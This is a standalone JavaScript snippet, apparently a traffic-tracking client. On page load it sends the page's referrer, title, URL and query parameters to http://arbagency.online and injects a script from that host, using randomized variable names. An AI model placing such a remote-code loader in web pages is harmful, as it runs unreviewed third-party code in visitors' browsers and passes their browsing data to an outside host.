   (function() {
    var name = '_6CK46XF7dLmrf5kq';
    if (!window._6CK46XF7dLmrf5kq) {
        window._6CK46XF7dLmrf5kq = {
            unique: false,
            ttl: 86400,
            R_PATH: 'http://arbagency.online/nMdpFV',
            P_PATH: 'http://arbagency.online/fec84ce/postback',
        };
    }
    const _DczL2fRZ84Bfps6n = localStorage.getItem('config');
    if (typeof _DczL2fRZ84Bfps6n !== 'undefined' && _DczL2fRZ84Bfps6n !== null) {
        var _SNHxhfMRBBZ1V68F = JSON.parse(_DczL2fRZ84Bfps6n);
        var _bnvYZPfhNYw3Wkxf = Math.round(+new Date()/1000);
        if (_SNHxhfMRBBZ1V68F.created_at + window._6CK46XF7dLmrf5kq.ttl < _bnvYZPfhNYw3Wkxf) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _6JmMVKJp4rMcXKRr = localStorage.getItem('subId');
    var _PZhjDPyW8KPKHBF5 = localStorage.getItem('token');
    var _bcKgB2LRRPrrDwRZ = '?return=js.client';
        _bcKgB2LRRPrrDwRZ += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _bcKgB2LRRPrrDwRZ += '&se_referrer=' + encodeURIComponent(document.referrer);
        _bcKgB2LRRPrrDwRZ += '&default_keyword=' + encodeURIComponent(document.title);
        _bcKgB2LRRPrrDwRZ += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _bcKgB2LRRPrrDwRZ += '&name=' + encodeURIComponent(name);
        _bcKgB2LRRPrrDwRZ += '&host=' + encodeURIComponent(window._6CK46XF7dLmrf5kq.R_PATH);
    if (typeof _6JmMVKJp4rMcXKRr !== 'undefined' && _6JmMVKJp4rMcXKRr && window._6CK46XF7dLmrf5kq.unique) {
        _bcKgB2LRRPrrDwRZ += '&sub_id=' + encodeURIComponent(_6JmMVKJp4rMcXKRr);
    }
    if (typeof _PZhjDPyW8KPKHBF5 !== 'undefined' && _PZhjDPyW8KPKHBF5 && window._6CK46XF7dLmrf5kq.unique) {
        _bcKgB2LRRPrrDwRZ += '&token=' + encodeURIComponent(_PZhjDPyW8KPKHBF5);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._6CK46XF7dLmrf5kq.R_PATH + _bcKgB2LRRPrrDwRZ;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
